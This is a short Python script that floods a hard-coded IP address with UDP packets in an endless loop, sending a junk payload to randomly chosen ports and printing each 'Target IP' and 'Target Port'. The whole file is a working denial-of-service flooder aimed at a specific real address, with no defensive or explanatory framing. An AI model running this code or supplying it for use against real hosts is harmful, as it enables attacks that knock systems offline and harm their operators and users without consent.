import socket
import random

while(True):
	random_ports = [100, 101, 102, 103, 104, 105, 106, 987, 432, 654, 980, 444, 333, 222, 111, 666, 777]

	UDP_IP = "188.114.96.2"
	UDP_PORT = random.choice(random_ports)
	MESSAGE = b"=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/=-*/"

	print("Target IP: " + UDP_IP)
	print("Target Port: " + str(UDP_PORT))

	sock = socket.socket(socket.AF_INET,
				socket.SOCK_DGRAM)
	sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
